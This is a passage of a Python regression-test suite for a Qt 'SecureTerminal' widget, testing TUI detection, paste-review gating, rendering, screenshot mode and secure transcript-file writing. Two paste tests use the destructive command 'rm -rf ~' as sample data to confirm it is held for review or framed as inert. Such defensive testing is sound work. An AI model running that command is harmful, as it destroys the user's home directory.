# --- REGRESSION: full-screen detection survives line_edits=false ---------------
# With line editing off the child runs under `secure-terminal-noedit`, which
# cancels el/el1 on top of the base entry's cup/cuu/smcup -- so a curses program
# emits no alternate screen, no cursor motion and no EL burst, and EVERY
# escape-based detector is structurally dead. The terminfo-independent fallback is
# the pty's own line discipline: raw mode plus a foreground program means that
# program is drawing its own screen.
_rawdir = tempfile.mkdtemp(prefix='st-noedit-')
_rawsh = os.path.join(_rawdir, 'raw.sh')
with open(_rawsh, 'w') as _rf:
    _rf.write('#!/bin/sh\nstty raw -echo\nprintf DRAWING\nsleep 20\n')
os.chmod(_rawsh, 0o700)
_plainsh = os.path.join(_rawdir, 'plain.sh')
with open(_plainsh, 'w') as _pf:
    _pf.write('#!/bin/sh\nprintf "PLAIN\\n"\nsleep 20\n')
os.chmod(_plainsh, 0o700)

_rw = SecureTerminal(command=_rawsh, line_edits=False)
_rw_adv: list[str] = []
_rw.advise_signal.connect(_rw_adv.append)
_rw.resize(700, 300)
_rw.show()
pump(900)
ok(_rw._child_raw_mode(), 'the pty line discipline reports the child raw mode')
ok(_rw._tui_hint_shown and any('TUI' in a for a in _rw_adv),
   'line_edits off: a keyboard-owning program still raises the TUI advisory')
_rw.shutdown()

_rw2 = SecureTerminal(command=_plainsh, line_edits=False)
_rw2_adv: list[str] = []
_rw2.advise_signal.connect(_rw2_adv.append)
_rw2.resize(700, 300)
_rw2.show()
pump(900)
ok(not _rw2._child_raw_mode(), 'ordinary line output leaves the pty cooked')
ok(not _rw2._tui_hint_shown,
   'ordinary line output under line_edits off raises no advisory')
_rw2.shutdown()

_rw3 = SecureTerminal(command=_rawsh)             # line editing ON
_rw3_adv: list[str] = []
_rw3.advise_signal.connect(_rw3_adv.append)
_rw3.resize(700, 300)
_rw3.show()
pump(900)
ok(not _rw3._tui_hint_shown,
   'the raw-mode fallback is confined to the line_edits-off setting')
_rw3.shutdown()

# ==============================================================================
# ai-review reconcile regression tests (each canary-verified: FAILS on pre-fix code)
# ==============================================================================
import secure_terminal.terminal as _TERM_rc                # noqa: E402


def _feed_defer(term, raw):
    """Feed `raw` through the live streaming path (defer=True) WITHOUT flushing the
    paint, so a debounced paint is left pending exactly as it is mid-16ms-window in
    the running app -- unlike feed_output, which flushes."""
    w: int | None
    r, w = os.pipe()
    old = term._fd                             # pylint: disable=protected-access
    term._fd = r
    try:
        os.write(w, raw)
        os.close(w)
        w = None
        term._on_readable()                    # pylint: disable=protected-access
    finally:
        term._fd = old
        os.close(r)
        if w is not None:
            os.close(w)


# --- reconcile #1: a MULTILINE paste in a TUI WITHOUT bracketed paste is HELD ---
# The forced review is exempted for a multiline paste ONLY when the child enabled
# bracketed paste (DEC 2004): only then is the payload buffered as inert data and
# cannot auto-run. A TUI that has NOT enabled it is no safer than line mode -- an
# embedded \r auto-executes -- so it must be held. paste_warn='never' isolates the
# forced-review gate from the ordinary risky-content gate. (Pre-fix: force_review
# = multiline and not tui_active(), so a non-bracketed TUI wrongly auto-ran it.)
_bp_no = SecureTerminal(command='/bin/cat', tui=True)
_bp_no.apply_paste_warn('never')
ok(_TERM_rc._BRACKETED_PASTE_MODE not in getattr(_bp_no._screen, 'mode', ()),
   'reconcile#1: the TUI child has NOT enabled bracketed paste')
_bp_sent = spy_writes(_bp_no)
_pm_bp = QMimeData()
_pm_bp.setText('echo one\nrm -rf ~\n')                     # embedded newline
_bp_no.insertFromMimeData(_pm_bp)
ok(_bp_no.review_pending() and _bp_sent == [],
   'reconcile#1: a multiline paste in a NON-bracketed TUI is held (nothing auto-runs)')
_bp_no.dispatch_pending_paste('reject')

# with bracketed paste ACTIVE the child buffers the payload, so the same multiline
# paste is exempt from the forced hold and delivered framed between 200~/201~.
_bp_yes = SecureTerminal(command='/bin/cat', tui=True)
_bp_yes.apply_paste_warn('never')
feed_output(_bp_yes, b'\x1b[?2004h')                       # enable DEC 2004
ok(_TERM_rc._BRACKETED_PASTE_MODE in getattr(_bp_yes._screen, 'mode', ()),
   'reconcile#1: bracketed paste is now enabled on the TUI child')
_bp_sent2 = spy_writes(_bp_yes)
_pm_bp2 = QMimeData()
_pm_bp2.setText('echo one\nrm -rf ~\n')
_bp_yes.insertFromMimeData(_pm_bp2)
ok(not _bp_yes.review_pending(), 'reconcile#1: a bracketed multiline paste is not held')
_bp_frame = b''.join(_bp_sent2)
ok(_bp_frame.startswith(b'\x1b[200~') and _bp_frame.endswith(b'\x1b[201~'),
   'reconcile#1: a bracketed paste is delivered framed as inert data')

# --- reconcile #3: expanded Unicode stays reachable by WRAPPING, never hidden -----
# A line of many non-ASCII cells renders each as a long Detail badge, far wider than
# the viewport. A real terminal has no horizontal scroll: the display WRAPS to the
# width (WidgetWidth) so every badge stays on screen -- nothing pushed off the right
# edge, and no auto-scroll that would clip the START of each row. In CLI the horizontal
# scrollbar policy stays as-needed only for the residual Box/Show wide-glyph overflow
# (left NoWrap for cross-mode stability, and home-pinned by _paint_line); a grid/TUI tab
# suppresses it entirely (AlwaysOff -- see the scrollbar-policy block near the top). It
# must NOT appear for a wrapped Detail line either way.
_hs = SecureTerminal(command='/bin/cat')                   # default Detail mode (CLI)
_hs.resize(220, 120)
_hs.show()
APP.processEvents()
ok(_hs.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAsNeeded,
   'reconcile#3: CLI keeps the horizontal scrollbar policy as-needed')
feed_output(_hs, ('\u00e9' * 40).encode('utf-8'))     # 40 long badges -> wide line
APP.processEvents()
eq(_hs.lineWrapMode(), _QPTE.LineWrapMode.WidgetWidth,
   'reconcile#3: Detail wraps the display to the width')
# The line is ~40 badges * ~40 chars, far wider than a 220px viewport: under NoWrap
# it would overflow (max > 0, as the home-pin canary above proves for Show mode), so
# max == 0 here IS the proof it wrapped to the width instead of scrolling.
ok(_hs.horizontalScrollBar().maximum() == 0,
   'reconcile#3: the wrapped Detail line needs NO horizontal scroll (nothing hidden off-screen)')
_hs.close()

# --- reconcile #4: a mid-debounce mode change drops the stale pending paint ------
# If a mode/color/marking change calls _rerender() during the 16ms paint debounce,
# the pending completed lines must be cleared FIRST -- else _rerender replays the
# raw tail AND the stale pending flushes too, duplicating output.
_dp = SecureTerminal(command='/bin/cat')
_feed_defer(_dp, b'dupline\ntail')                         # one completed line + tail
ok(_dp._paint_dirty, 'reconcile#4: a paint is pending mid-debounce (not yet flushed)')
_dp.apply_markings(not _dp.markings_enabled())             # a live toggle -> _rerender
eq(_dp.transcript_text().count('dupline'), 1,
   'reconcile#4: a mid-debounce rerender does not duplicate the pending line')

# --- reconcile #5: a theme switch recolours existing CLI markings ----------------
# MARKING_COLORS is theme-keyed. apply_theme() clears the caches, but formats
# already in the CLI document keep the old palette until repainted. A theme switch
# must rebuild the CLI document so existing markings take the new theme's colours.
_tht = SecureTerminal(command='/bin/cat')
_tht.apply_theme('light')
feed_output(_tht, b'\xc3\xa9')                             # e-acute -> a nonascii marking
eq(fmt_of_char(_tht, '<').foreground().color().name(), mark_fg(_tht, 'nonascii'),
   'reconcile#5: the existing marking uses the light-theme colour before the switch')
_tht.apply_theme('dark')
eq(fmt_of_char(_tht, '<').foreground().color().name(), mark_fg(_tht, 'nonascii'),
   'reconcile#5: after the switch the existing marking uses the DARK theme colour')

# --- reconcile #6: Show mode keeps a REAL U+2423, collapses the synthetic marker --
# A U+2423 OPEN BOX the child actually printed (source cp IS 0x2423) is kept as its
# glyph on copy; the SYNTHETIC SPACE_MARK for a neutralized non-ASCII space is the
# same glyph but its source cp is the space byte, so it collapses to '_'. The copy
# path tells them apart via the recorded codepoint (a blind string map clobbered
# the real glyph -- the regression).
_rb = SecureTerminal(command='/bin/cat')
_rb.apply_mode('show')
feed_output(_rb, b'\xe2\x90\xa3')                          # a literal U+2423 OPEN BOX
_rb.selectAll()
ok('\u2423' in _rb._selection_text(),
   'reconcile#6: a real printed U+2423 in Show mode is kept as its glyph on copy')
_sm = SecureTerminal(command='/bin/cat')
_sm.apply_mode('show')
feed_output(_sm, b'\xc2\xa0')                              # NBSP -> synthetic SPACE_MARK
_sm.selectAll()
_sm_copy = _sm._selection_text()
ok('_' in _sm_copy and '\u2423' not in _sm_copy,
   'reconcile#6: the synthetic non-ASCII-space marker still copies as _ (never a space)')

# --- SECURE_TERMINAL_SHOT: deterministic screenshot mode (#51) ----------------
# A startup capture MODE (env, not a persisted per-tab setting): the caret is
# hidden and the document renders SYNCHRONOUSLY, so a capture of unchanged content
# is byte-identical run to run (the comparison shots jitter otherwise -- an async
# paint race lands the prompt +/-1 row, plus the blinking caret). Every branch is
# gated on the flag; with it OFF the render path is unchanged (a matched control
# widget asserts that below).
import hashlib as _st_hl


def _grab_sha(w):
    """sha256 of the widget's rendered pixels -- the 'byte-identical output' the
    shot mode must guarantee for the same content across two independent renders."""
    img = w.grab().toImage()
    ptr = img.constBits()
    ptr.setsize(img.sizeInBytes())
    return _st_hl.sha256(bytes(ptr)).hexdigest()


# Control (shot mode OFF, built with the env unset): the CLI paint DEFERS to the
# 16ms debounce timer. The native caret is hidden in BOTH modes (we draw our own
# blinking cursor); shot mode additionally suppresses ours for a byte-stable capture.
_ns = SecureTerminal(command='/bin/cat')
ok(_ns._shot is False, 'shot off: the flag is False when SECURE_TERMINAL_SHOT is unset')
ok(_ns.cursorWidth() == 0, 'shot off: the native caret is hidden (we draw our own)')
_ns._feed_line('deferred-line\n', defer=True)
ok(_ns._paint_dirty is True, 'shot off: a deferred CLI paint stays pending (not flushed)')
ok(_ns._paint_timer.isActive(), 'shot off: the CLI paint is debounced on the timer')
# Control (shot OFF) TUI: the grid repaint defers to _render_timer, so the fed row
# is NOT in the document yet (no event loop ran the single-shot timer).
_nst = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_nst, b'grid-off\r\n')
ok(_nst._render_timer.isActive(), 'shot off: the TUI grid repaint is debounced on the timer')

os.environ['SECURE_TERMINAL_SHOT'] = '1'
try:
    # __init__: the flag is read and the caret is hidden (cursorWidth 0 -> no frame
    # depends on the blink phase).
    _s1 = SecureTerminal(command='/bin/cat')
    ok(_s1._shot is True, 'shot on: SECURE_TERMINAL_SHOT=1 sets the flag')
    eq(_s1.cursorWidth(), 0, 'shot on: the caret is hidden (cursorWidth 0)')
    # _feed_line: a deferred CLI paint is forced synchronous -> painted NOW, no timer.
    _s1._feed_line('sync-line\n', defer=True)
    ok(_s1._paint_dirty is False, 'shot on: the CLI paint flushed synchronously (nothing pending)')
    ok(not _s1._paint_timer.isActive(), 'shot on: no CLI debounce timer is armed')
    ok('sync-line' in _s1.toPlainText(), 'shot on: the fed line is in the document immediately')
    # TUI read path: the grid repaint renders synchronously (no _render_timer), so the
    # fed row is already in the document with no event loop.
    _st = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_st, b'grid-on\r\n')
    ok(not _st._render_timer.isActive(), 'shot on: the TUI grid rendered synchronously, no debounce timer')
    ok('grid-on' in _st.toPlainText(), 'shot on: the fed grid row is in the document immediately')

    # Determinism proof: two INDEPENDENT shot-mode widgets fed identical content render
    # byte-identical pixels; different content renders different pixels (so the hash is
    # not trivially constant). This is the jitter the mode removes.
    _d1 = SecureTerminal(command='/bin/cat'); _d1.resize(600, 400)
    _d2 = SecureTerminal(command='/bin/cat'); _d2.resize(600, 400)
    _shot_payload = b'user@host:~$ echo hello\r\nhello\r\nuser@host:~$ \r\n'
    feed_output(_d1, _shot_payload)
    feed_output(_d2, _shot_payload)
    _h1, _h2 = _grab_sha(_d1), _grab_sha(_d2)
    ok(_h1 == _h2, 'shot on: identical content renders byte-identical pixels (sha256 match)')
    _d3 = SecureTerminal(command='/bin/cat'); _d3.resize(600, 400)
    feed_output(_d3, b'user@host:~$ echo DIFFERENT\r\nDIFFERENT\r\n')
    ok(_grab_sha(_d3) != _h1, 'shot on: different content renders different pixels (hash reflects content)')
    for _sw in (_s1, _st, _d1, _d2, _d3):
        _sw.shutdown()
finally:
    del os.environ['SECURE_TERMINAL_SHOT']
for _sw in (_ns, _nst):
    _sw.shutdown()

# --- SECURE_TERMINAL_TRANSCRIPT_FILE: live transcript file (mode-agnostic) -----
# A generic configuration (NOT shot-mode-gated): when the env names a path, each read
# (re)writes this tab's transcript_text() there, atomically. A capture harness reads it
# to VERIFY a shot actually rendered its payload -- a screenshot cannot tell an empty
# terminal from a full one, the window chrome paints either way.
_tp = os.path.join(tempfile.mkdtemp(prefix='st-tr-'), 'transcript.txt')
os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE'] = _tp
try:
    # Mode-agnostic: the env is honoured even with shot mode OFF (the path is not gated on
    # shot mode). The write is debounced to the trailing edge of an output burst, so pump
    # the loop past the ~30ms timer before reading -- this is also AFTER the render, so the
    # file reflects the painted frame (CLI and TUI alike).
    _td = SecureTerminal(command='/bin/cat')          # NB: shot mode is OFF here
    eq(_td._transcript_file, _tp,
       'transcript file: the path is read from the env (mode-agnostic, no shot mode needed)')
    feed_output(_td, b'user@host:~$ cat demo\r\nMARKER-CLI\r\n')
    pump(80)
    ok(os.path.exists(_tp), 'transcript file: written once output settles')
    with open(_tp, encoding='utf-8') as _trfh:
        _written = _trfh.read()
    ok('MARKER-CLI' in _written, 'transcript file: carries the CLI rendered output')
    _td.shutdown()
    # TUI / alt screen: transcript_text() walks the rendered document, so the alt-screen
    # frame lands in the file too -- exactly the surface a capture uses to reject an empty
    # grab. The debounce fires after the deferred TUI render, so no pre-render lag.
    _tdt = SecureTerminal(command='/bin/cat', tui=True)
    _tdt.resize(600, 300)
    _tdt.show()
    pump(40)
    feed_output(_tdt, b'\x1b[?1049h\x1b[2J\x1b[HMARKER-TUI')
    pump(80)
    with open(_tp, encoding='utf-8') as _trfh:
        _written_tui = _trfh.read()
    ok('MARKER-TUI' in _written_tui,
       'transcript file: carries the TUI (alt-screen) rendered frame')
    _tdt.shutdown()
    # Race guarantee: the write forces a PENDING grid render before serialising, so the
    # file reflects the latest frame even if the transcript debounce fires before the
    # render debounce (possible under load). Write IMMEDIATELY (render still pending, no
    # pump) and the flush makes the frame land anyway.
    _tdr = SecureTerminal(command='/bin/cat', tui=True)
    _tdr.resize(600, 300)
    _tdr.show()
    pump(40)
    feed_output(_tdr, b'\x1b[?1049h\x1b[2J\x1b[HMARKER-RACE')
    ok(_tdr._render_timer.isActive(),
       'transcript file: a TUI grid render is pending right after the read')
    _tdr._write_transcript_file()          # must flush that pending render first
    with open(_tp, encoding='utf-8') as _trfh:
        _raced = _trfh.read()
    ok('MARKER-RACE' in _raced,
       'transcript file: the write forces a pending render (no pre-render lag under load)')
    _tdr.shutdown()
finally:
    del os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE']
# Opt-in only: no env -> no path, no writes (a normal session never spills to disk).
_tn = SecureTerminal(command='/bin/cat')
ok(_tn._transcript_file is None,
   'transcript file: no path unless SECURE_TERMINAL_TRANSCRIPT_FILE is set')
_tn.shutdown()

# transcript file: a co-resident attacker who pre-plants a file at the (old, guessable)
# <path>.tmp must not capture the secret transcript. The write now uses an unguessable
# mkstemp name created O_EXCL + 0o600, so the pre-planted file is never reused and the
# result is always owner-only -- the fixed-name O_TRUNC path would have RENAMED the
# planted inode into place, keeping the attacker's mode.
_secdir = tempfile.mkdtemp(prefix='st-trsec-')
_secpath = os.path.join(_secdir, 'transcript.txt')
_planted = _secpath + '.tmp'
with open(_planted, 'w', encoding='utf-8'):
    pass
_plant_ino = os.stat(_planted).st_ino                   # the attacker's pre-planted <path>.tmp
os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE'] = _secpath
try:
    _tsec = SecureTerminal(command='/bin/cat')
    feed_output(_tsec, b'SECRET-XYZ\r\n')
    pump(80)
    _mode = os.stat(_secpath).st_mode & 0o777
    with open(_secpath, encoding='utf-8') as _secfh:
        _secwritten = _secfh.read()
    # The fixed-name O_TRUNC path REUSES the plant (its inode becomes the transcript,
    # keeping the attacker's mode); mkstemp writes a FRESH 0o600 inode and never touches
    # the plant. Assert both: a distinct inode, and owner-only mode. (Inode identity is
    # umask-independent, so it is the load-bearing canary.)
    ok(os.stat(_secpath).st_ino != _plant_ino and _mode == 0o600
       and 'SECRET-XYZ' in _secwritten,
       'transcript file: a pre-planted <path>.tmp is not reused; written owner-only 0o600 '
       '(mode 0o%o)' % _mode)
    _tsec.shutdown()
finally:
    del os.environ['SECURE_TERMINAL_TRANSCRIPT_FILE']

# --- alt-screen viewport pins to the TOP (row 0 stays visible) -----------------
# A full-screen program on the alternate screen owns a fixed canvas with no scrollback:
# its row 0 is the TOP of its screen and must stay visible. When the grid is TALLER than
# the viewport (a scroll range exists), the OLD code followed the tail and scrolled that
# row 0 off the top -- the bug that rendered the altscreen-tui comparison shot as an empty
# terminal (its payload draws a single line at row 0). Force the scroll range: enter the
# alt screen, grow the pyte grid past the viewport, put content at row 0, and assert the
# view is pinned to the TOP (row 0 visible, scrollbar at its minimum), not the tail. FAILS
# on the pre-fix follow-tail behaviour, so it is a real regression trip.
_avs = SecureTerminal(command='/bin/cat', tui=True)
_avs.resize(600, 300)                       # ~18-row viewport
_avs.show()
pump(60)
feed_output(_avs, b'\x1b[?1049h')           # enter the alternate screen
_avs._screen.resize(60, _avs._screen.columns)   # grid far taller than the viewport
feed_output(_avs, b'\x1b[2J\x1b[HTOP-ROW-CONTENT')   # content at row 0 of the tall grid
pump(60)
ok(_avs._alt_screen, 'alt-screen top-pin: on the alternate screen after the enter marker')
_avs_bar = _avs.verticalScrollBar()
ok(_avs_bar.maximum() > _avs_bar.minimum(),
   'alt-screen top-pin: the tall grid really does create a scroll range (else the test is vacuous)')
eq(_avs.firstVisibleBlock().blockNumber(), 0,
   'alt-screen top-pin: row 0 stays visible (the frame is not scrolled off the top)')
eq(_avs_bar.value(), _avs_bar.minimum(),
   'alt-screen top-pin: the view is pinned to the top, not the tail')
_avs.shutdown()

# --- Incremental TUI grid render: same document as a full rebuild, but linear --
# A full-viewport 24-bit board has a DISTINCT truecolour in every cell, so the
# same-format run coalescing never fires and each row is ~one insertText per
# column. Re-rendering the WHOLE grid on every PTY read was then quadratic (the
# ~20s show-mode gradient-board render). The incremental renderer keeps every
# unchanged block, promotes scrolled-off rows to permanent scrollback, and
# re-renders only the changed rows -- so a row is drawn about once (linear) while
# producing a byte-identical document. The signature IS the rendered runs, so any
# theme / mode / marking / colour change forces a correct re-render (never stale).


def _distinct_board(cols, rows):
    """Bytes for a rows x cols board where every cell is a distinct truecolour
    upper-half-block, so no two adjacent cells share a format (no run coalescing
    -- the renderer's worst case, and the real gradient board's shape)."""
    block = '\u2580'                       # upper half block, ASCII-escaped
    out = []
    for y in range(rows):
        line = []
        for x in range(cols):
            line.append('\x1b[38;2;%d;%d;%dm\x1b[48;2;%d;%d;%dm%s'
                        % ((x * 7) % 256, (y * 11) % 256, (x + y) % 256,
                           (y * 13) % 256, (x * 5) % 256, (x * y) % 256, block))
        out.append(''.join(line) + '\x1b[0m')
    return ('\r\n'.join(out) + '\r\n').encode()


def _fmt_key(fmt):
    return (fmt.foreground().color().name(), fmt.background().color().name(),
            int(fmt.fontWeight()), fmt.fontUnderline())


def _doc_cells(term):
    """Every rendered character with its format (fg / bg / weight / underline), so
    two documents can be compared for identical CONTENT and IDENTICAL formatting --
    an incremental render that left a cell stale diverges here. In TUI grid mode the
    formats live in the block's _GridRow (the highlighter's layout formats are not
    on the char format), so read them from there; line mode reads the fragments."""
    doc = term.document()
    cells = []
    blk = doc.begin()
    while blk.isValid():
        data = blk.userData()
        if isinstance(data, _GR):
            base = blk.position()
            for start, length, fmt, _cp in data.runs:
                seg = QTextCursor(doc)
                seg.setPosition(base + start)
                seg.setPosition(base + start + length, QTextCursor.MoveMode.KeepAnchor)
                for ch in seg.selectedText():
                    cells.append((ch, _fmt_key(fmt)))
        else:
            it = blk.begin()
            while not it.atEnd():
                frag = it.fragment()
                for ch in frag.text():
                    cells.append((ch, _fmt_key(frag.charFormat())))
                it += 1
        cells.append(('\n', None))
        blk = blk.next()
    return cells


def _feed_render_chunks(term, data, chunks):
    """Feed `data` in `chunks` reads, rendering after each -- the shot-mode /
    progressive-draw path the incremental renderer has to keep linear."""
    n = len(data)
    step = max(1, n // chunks)
    i = 0
    while i < n:
        term._feed_stream(data[i:i + step])
        term._render_tui()
        i += step


def _show_grid(mode_markings_theme=(None, None)):
    _t = SecureTerminal(command='/bin/cat', tui=True)
    _t.apply_mode('show')
    _t.resize(1200, 700)
    _t.show()
    pump(60)
    _mk, _th = mode_markings_theme
    if _mk is not None:
        _t.apply_markings(_mk)
    if _th is not None and _th != _t._theme:
        _t.apply_theme(_th)
    return _t


# 1. A fits-on-screen board drawn progressively over many reads renders to the
# SAME document (content + formats) as one full-rebuild render of the same bytes.
_ib = _show_grid()
_ibc = min(60, _ib._screen.columns)
_ibr = min(18, _ib._screen.lines - 2)
_ib_board = _distinct_board(_ibc, _ibr)
_feed_render_chunks(_ib, _ib_board, 12)
_ib_ref = _show_grid()
_ib_ref._feed_stream(_ib_board)
_ib_ref._render_tui()
eq(_doc_cells(_ib), _doc_cells(_ib_ref),
   'incremental progressive render == a single full rebuild (content + every format)')
_ib.shutdown()
_ib_ref.shutdown()

# 2. Linearity: each of the board's rows is inserted about once (plus a small
# re-render of the active tail), NOT re-inserted on every read. A full rebuild
# per read would insert many multiples of the row count. FAILS on the old code.
_orig_igr = SecureTerminal._insert_grid_row
_igr_calls = [0]


def _counting_igr(self, cursor, row, columns, cell_runs=None):
    _igr_calls[0] += 1
    return _orig_igr(self, cursor, row, columns, cell_runs)


SecureTerminal._insert_grid_row = _counting_igr
try:
    _pfg = _show_grid()
    _pfr = min(18, _pfg._screen.lines - 2)
    _feed_render_chunks(_pfg, _distinct_board(min(60, _pfg._screen.columns), _pfr), 12)
    _rowins = _igr_calls[0]
    _pfg.shutdown()
finally:
    SecureTerminal._insert_grid_row = _orig_igr
ok(_rowins < 3 * _pfr,
   'incremental grid inserts each row ~once (%d inserts for %d rows over 12 reads), '
   'not once per read' % (_rowins, _pfr))

# 3. Scroll flood (3 screens): the incremental render, promoting scrolled-off
# rows to permanent scrollback, is byte-identical to a full rebuild, and keeps
# the live grid bounded to ~one screen even as the document grows.
_fl = _show_grid()
_flr = _fl._screen.lines
_fl_flood = _distinct_board(min(50, _fl._screen.columns), _flr * 3)
_feed_render_chunks(_fl, _fl_flood, 20)
_fl_ref = _show_grid()
_fl_ref._feed_stream(_fl_flood)
_fl_ref._render_tui()
eq(_doc_cells(_fl), _doc_cells(_fl_ref),
   'incremental scroll flood == full rebuild (promoted scrollback rows byte-identical)')
ok(_fl._grid_rows <= _flr + 1,
   'scroll flood keeps the live grid bounded (rows promoted to permanent scrollback)')
ok(_fl.document().blockCount() > _flr + 1,
   'scroll flood grew the document past one screen (scrollback retained)')
_fl.shutdown()
_fl_ref.shutdown()

# 4. Fallback: rows that scroll into history without having been rendered as
# leading grid blocks (many lines fed with NO render between) take the correct
# full-rebuild path.
_fb = SecureTerminal(command='/bin/cat', tui=True)
_fb.apply_mode('show')
_fb.resize(700, 300)
_fb.show()
pump(40)
for _k in range(_fb._screen.lines * 2):
    _fb._feed_stream(('fb-row-%02d\r\n' % _k).encode())        # NO render between feeds
_fb._render_tui()                                              # one render -> fallback
ok('fb-row-%02d' % (_fb._screen.lines * 2 - 1) in _fb.toPlainText(),
   'fallback full rebuild renders the latest row')
ok('fb-row-00' in _fb.toPlainText(),
   'fallback full rebuild renders the scrolled-off history')
_fb.shutdown()

# 5. A row mutated AND scrolled off within a single un-rendered read is NOT
# promoted from its now-stale block: the signature recheck fails, so the frame
# takes the full-rebuild fallback and shows the NEW content.
_mu = SecureTerminal(command='/bin/cat', tui=True)
_mu.apply_mode('show')
_mu.resize(700, 300)
_mu.show()
pump(40)
_mu._feed_stream(b'\x1b[1;1HORIG-TOP\r\nsecond\r\n')
_mu._render_tui()                                    # ORIG-TOP rendered as grid row 0
_mu._feed_stream(b'\x1b[1;1HNEWTOP-X' + b'\r\n' * (_mu._screen.lines + 2))
_mu._render_tui()
ok('NEWTOP-X' in _mu.toPlainText(),
   'a row mutated then scrolled within one read renders its NEW content (fallback)')
ok('ORIG-TOP' not in _mu.toPlainText(),
   'the stale pre-mutation row content is not kept')
_mu.shutdown()

# 6. Drift-proof: an incremental re-render after a markings + theme change equals
# a fresh full build already in that final state -- no cell keeps a stale format,
# because the per-row signature is the rendered runs themselves.
_drb = _distinct_board(30, 8)
_A = _show_grid((False, 'dark'))
_A._feed_stream(_drb)
_A._render_tui()
_A.apply_markings(True)                              # cache clear -> incremental re-render
_A.apply_theme('light')                              # cache clear -> incremental re-render
_B = _show_grid((True, 'light'))                     # the final state, up front
_B._feed_stream(_drb)
_B._render_tui()                                      # a single full build
eq(_doc_cells(_A), _doc_cells(_B),
   'incremental re-render after markings+theme change == a fresh full build (no stale formats)')
_A.shutdown()
_B.shutdown()

# 7. A no-change re-render is a near-noop: nothing is deleted or appended (the
# empty-append and no-delete branches), and the content is preserved.
_nc = SecureTerminal(command='/bin/cat', tui=True)
_nc.apply_mode('show')
_nc.resize(700, 300)
_nc.show()
pump(40)
_nc._feed_stream(b'\x1b[1;1Hstable-row')
_nc._render_tui()
_nc_bc = _nc.document().blockCount()
_nc._render_tui()                                    # identical state -> no delete, no append
eq(_nc.document().blockCount(), _nc_bc,
   'a no-change re-render neither deletes nor appends grid blocks')
ok('stable-row' in _nc.toPlainText(), 'a no-change re-render preserves content')
_nc.shutdown()

# 8. The grid shrinks when output clears to fewer rows: the divergent-tail delete
# removes the now-absent trailing blocks (target shorter than the live grid).
_sk = SecureTerminal(command='/bin/cat', tui=True)
_sk.apply_mode('show')
_sk.resize(700, 300)
_sk.show()
pump(40)
_sk._feed_stream(b'\x1b[1;1Hr1\r\nr2\r\nr3\r\nr4\r\nr5')
_sk._render_tui()
_sk_tall = _sk.document().blockCount()
_sk._feed_stream(b'\x1b[2J\x1b[1;1Hjust-one')        # clear -> a single short row
_sk._render_tui()
ok(_sk.document().blockCount() < _sk_tall,
   'incremental render shrinks the grid when output clears to fewer rows')
ok(_sk.toPlainText().strip().endswith('just-one'),
   'the shrunk grid ends at the new short content')
_sk.shutdown()

# 9. Alt screen reconciles incrementally too: a full-screen program repainting
# one row updates that row and keeps the rest, with a correct frame. Driven via
# the real read path (feed_output) so the alternate-screen state is tracked.
_alt = SecureTerminal(command='/bin/cat', tui=True)
_alt.apply_mode('show')
_alt.resize(700, 300)
_alt.show()
pump(40)
feed_output(_alt, b'\x1b[?1049h')                    # enter the alternate screen
feed_output(_alt, b'\x1b[2J\x1b[1;1HALT-A\x1b[2;1HALT-B\x1b[3;1HALT-C')
_alt._render_tui()
ok(_alt._alt_screen and 'ALT-A' in _alt.toPlainText() and 'ALT-C' in _alt.toPlainText(),
   'alt-screen incremental: the initial frame is rendered')
feed_output(_alt, b'\x1b[2;1HALT-XYZ')               # repaint only row 2
_alt._render_tui()
_alt_txt = _alt.toPlainText()
ok('ALT-XYZ' in _alt_txt and 'ALT-A' in _alt_txt and 'ALT-C' in _alt_txt,
   'alt-screen incremental: a one-row repaint updates that row and keeps the others')
ok('ALT-B' not in _alt_txt, 'alt-screen incremental: the old row content is gone')
_alt.shutdown()

# 10. A scrollback cap smaller than one screen prunes the oldest grid blocks: the
# incremental model keeps only the surviving trailing rows in step, so the next
# delete never computes a negative start (no crash, model stays consistent).
_cap = SecureTerminal(command='/bin/cat', tui=True)
_cap.apply_mode('show')
_cap.apply_scrollback(4)
_cap.resize(700, 400)
_cap.show()
pump(40)
for _k in range(_cap._screen.lines):
    _cap._feed_stream(('cap-%02d\r\n' % _k).encode())
    _cap._render_tui()
ok(_cap.document().blockCount() >= 1 and _cap._grid_rows <= _cap.document().blockCount(),
   'a tiny scrollback cap keeps the incremental grid render consistent (no crash)')
eq(len(_cap._grid_row_sig), _cap._grid_rows,
   'the incremental model tracks exactly the surviving grid blocks under a tiny cap')
_cap.shutdown()

# 11. The trailing-blank trim tests the RENDERED glyph, not cell.data.strip(): a
# lone U+00A0 (str.strip() drops it as whitespace) renders as a visible MARKED
# placeholder, so its row below the cursor must be kept, never trimmed away and
# hidden. FAILS on the old str.strip() trim.
_tr = SecureTerminal(command='/bin/cat', tui=True)
_tr.apply_mode('show')
_tr.resize(700, 400)
_tr.show()
pump(40)
# draw a marked non-breaking space at screen row 6, then move the cursor UP to row 2
_tr._feed_stream('\x1b[1;1Htop\x1b[6;1H\u00a0\x1b[2;1H'.encode())
_tr._render_tui()
ok(_tr._grid_rows >= 6,
   'a marked space (U+00A0) below the cursor keeps its row (rendered-glyph trim, not strip())')
_tr.shutdown()

# 12. Scrollback tracking holds already-rendered history rows BY REFERENCE, not by
# id(): Python can recycle an evicted row's id for a new object, so an id-only set
# could mistake a genuinely new scrolled row for one already rendered and DROP it.
# _new_history_rows compares by identity against the held _top_rows. (ai-review)
_ir = SecureTerminal(command='/bin/cat', tui=True)
_ir.apply_mode('show')
_ir.resize(700, 300)
_ir.show()
pump(40)
_r1, _r2, _r3 = {'r': 1}, {'r': 2}, {'r': 3}
_ir._top_rows = [_r1, _r2]                          # already rendered as scrollback
eq(_ir._new_history_rows([_r1, _r2, _r3]), [_r3],
   'only the genuinely new (by identity) history row counts as new')
_r2b = {'r': 2}                                     # value-equal to _r2, different object
_new = _ir._new_history_rows([_r1, _r2b])
ok(len(_new) == 1 and _new[0] is _r2b,
   'a different object is new even when value-equal (identity, not value, comparison)')
# after a real render _top_rows holds the history rows by reference (so their ids
# cannot be recycled), not a set of ints
for _k in range(_ir._screen.lines + 3):
    _ir._feed_stream(('href-%02d\r\n' % _k).encode())
_ir._render_tui()
_htop = list(_ir._screen.history.top)
ok(_htop and all(any(_h is _t for _t in _ir._top_rows) for _h in _htop[-3:]),
